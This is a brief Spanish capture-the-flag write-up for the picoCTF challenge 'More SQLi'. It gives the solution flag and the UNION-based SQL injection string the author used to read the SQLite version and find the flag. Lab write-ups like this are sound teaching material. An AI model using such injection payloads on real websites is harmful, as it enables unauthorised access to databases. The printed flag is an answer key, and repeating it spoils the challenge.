# Reto 
More SQLi
# Descripción 
Can you find the flag on this website.

Additional details will be available after launching your challenge instance.
# Solución
picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_98236ce6}
# Notas adicionales
use la siguiente sentencia para usarla en la pagina en donde nos la proporcionaron y de ahi fui viendo las versiones y de ahi pude encontrar la flag 
select * from offices where city='  hola' union select 1,sqlite_version(),3;
# Referencias